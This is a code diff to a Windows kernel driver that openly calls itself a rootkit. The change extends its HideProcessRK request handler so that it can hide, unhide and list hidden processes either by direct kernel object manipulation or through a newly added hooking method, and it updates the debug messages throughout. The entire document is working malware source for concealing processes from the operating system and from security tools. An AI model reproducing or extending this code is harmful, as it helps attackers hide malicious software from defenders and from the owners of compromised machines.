@@ -696,7 +696,6 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 
 
 NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
-	// TODO: MAKE SURE MEDIUM GETS PID IF RIGHT, IF NOT RETURNS VIA THE MODULE NAME STRING INITAL OPERATION
 	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM (process with PID = %llu, index = %llu)\n", RootkInst->MainPID, RootkInst->SemiPID);
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	PEPROCESS MediumProcess = { 0 };
@@ -712,59 +711,71 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 		!(ProcessManType == HideProcess || ProcessManType == UnhideProcess || ProcessManType == ListHiddenProcesses) ||
 		(ProcessManType == ListHiddenProcesses && RootkInst->MedPID == 0) ||
 		(ProcessManType == ListHiddenProcesses && RootkInst->Out == NULL)) {
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (invalid PID: %llu, %llu, %llu / invalid request number: %llu / invalid output buffer: %p)\n", RootkInst->MainPID, RootkInst->SemiPID, RootkInst->MedPID, ProcessManType, RootkInst->Out);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook failed (invalid PID: %llu, %llu, %llu / invalid request number: %llu / invalid output buffer: %p)\n", RootkInst->MainPID, RootkInst->SemiPID, RootkInst->MedPID, ProcessManType, RootkInst->Out);
 		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Pass PID of process to DKOM function:
 	if (ProcessManType == HideProcess) {
-		Status = process::DKHideProcess(RootkInst->MainPID, TRUE);
+		if (IS_DKOM) {
+			Status = process::DKHideProcess(RootkInst->MainPID, TRUE);
+		}
+		else {
+			Status = process::SIHideProcess(RootkInst->MainPID);
+		}
 		if (Status == STATUS_NOT_FOUND) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
 		}
 		else if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (hiding function with PID of %llu failed with status 0x%x)\n", RootkInst->MainPID, Status);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook failed (hiding function with PID of %llu failed with status 0x%x)\n", RootkInst->MainPID, Status);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM succeeded, hidden process with PID of %llu\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM/hook succeeded, hidden process with PID of %llu\n", RootkInst->MainPID);
 	}
 	else if (ProcessManType == UnhideProcess) {
-		if (RootkInst->MainPID == REMOVE_BY_INDEX_PID) {
-			Status = process::DKUnhideProcess(REMOVE_BY_INDEX_PID, (ULONG)RootkInst->SemiPID);  // Remove via index
+		if (IS_DKOM) {
+			Status = process::DKUnhideProcess(RootkInst->MainPID, (ULONG)RootkInst->SemiPID);  // Remove via index/PID
 			if (Status == STATUS_NOT_FOUND) {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (did not find process at index %llu)\n", RootkInst->SemiPID);
 				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
 			}
 		}
 		else {
-			Status = process::DKUnhideProcess(RootkInst->MainPID, 0);  // Remove via PID
-			if (Status == STATUS_NOT_FOUND) {
-				DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
-				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
-			}
+			Status = process::SIUnhideProcess(&RootkInst->MainPID, (ULONG*)(&RootkInst->SemiPID));  // Remove via index/PID
 		}
 		if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (unhiding function with PID of %llu / index of %llu failed with status 0x%x)\n", RootkInst->MainPID, RootkInst->SemiPID, Status);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM/hook failed (unhiding function with PID of %llu / index of %llu failed with status 0x%x)\n", RootkInst->MainPID, RootkInst->SemiPID, Status);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM succeeded, unhidden process with PID %llu / index %llu\n", RootkInst->MainPID, RootkInst->SemiPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM/hook succeeded, unhidden process with PID %llu / index %llu\n", RootkInst->MainPID, RootkInst->SemiPID);
 	}
 	else {
 		if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &MediumProcess))) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM/hook failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 		}
-		if (!NT_SUCCESS(process::DKListHiddenProcesses(&TempSize, &HiddenInput))) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Error in ListHiddenProcesses())\n");
-			if (HiddenInput != NULL) {
-				ExFreePool(HiddenInput);
+		if (IS_DKOM) {
+			if (!NT_SUCCESS(process::DKListHiddenProcesses(&TempSize, &HiddenInput))) {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Error in ListHiddenProcesses())\n");
+				if (HiddenInput != NULL) {
+					ExFreePool(HiddenInput);
+				}
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 			}
-			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+		}
+		else {
+			if (!NT_SUCCESS(process::SIListHiddenProcesses(&TempSize, &HiddenInput))) {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via hooking failed (Error in ListHiddenProcesses())\n");
+				if (HiddenInput != NULL) {
+					ExFreePool(HiddenInput);
+				}
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
+			}
 		}
 		if (TempSize == 0) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Empty list, ListSize = 0)\n");
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM/hook failed (Empty list, ListSize = 0)\n");
 			if (HiddenInput != NULL) {
 				ExFreePool(HiddenInput);
 			}
@@ -793,7 +804,7 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 		if (HiddenInput != NULL) {
 			ExFreePool(HiddenInput);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM succeeded\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM/hook succeeded\n");
 	}
 	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
